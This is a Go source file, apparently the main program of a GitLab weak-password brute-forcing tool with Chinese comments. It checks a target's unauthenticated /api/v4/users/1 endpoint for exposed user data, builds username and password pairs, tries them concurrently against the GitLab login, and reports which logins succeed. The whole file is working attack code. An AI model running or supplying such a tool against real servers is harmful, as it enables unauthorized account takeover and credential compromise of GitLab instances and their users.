package main

import (
	"fmt"
	"gitlab_weakpassword/Data"
	"gitlab_weakpassword/brute"
	"gitlab_weakpassword/utils"
	"os"
	"strings"
	"sync"
)

func main() {
	//输入处理程序
	if len(os.Args) < 2 {
		println("请输入参数 例如 ./gitlab_wp https://gitlab.xxx.cn:9090")
		return
	}
	url := ""
	args := os.Args[1]
	protocol := "http://"
	host := ""
	if strings.HasPrefix(args, "https://") {
		protocol = "https://"
		args = strings.TrimPrefix(args, "https://")
	} else if strings.HasPrefix(args, "http://") {
		args = strings.TrimPrefix(args, "http://")
	}
	splitedArgs := strings.Split(args, "/")
	if len(splitedArgs) > 1 {
		host = splitedArgs[0]
	} else {
		host = args
	}
	url = protocol + host
	//缓冲段
	println(url)
	get, err := utils.HttpGet(url + "/api/v4/users/1")
	if err != nil {
		return
	}
	if !strings.Contains(get, "username") {
		fmt.Println("haven't vuln")
		os.Exit(0)
	}
	//主程序
	res, _ := brute.GetAuthorList(Data.TargetInfo{
		Protocol: protocol,
		Host:     host,
	})
	// 创建一个同步等待组
	var wg sync.WaitGroup

	// 创建一个最大5的协程数的通道
	limit := make(chan struct{}, 20)
	//fmt.Println(res)
	for _, key := range res {
		wg.Add(1)
		// 尝试向通道添加一个新的值
		limit <- struct{}{}
		go func(key Data.Author) {
			defer wg.Done()
			//开始代码块
			_, err := brute.LoginToGitLab(url, key.Username, key.Password)
			if err != nil {
				//println(err.Error())
				fmt.Printf("登录失败 %v %v                 \r", key.Username, key.Password)
			} else {
				fmt.Printf("\n登录成功 %v %v                 \n", key.Username, key.Password)
			}
			//结束代码块
			<-limit
		}(key)

	}

}
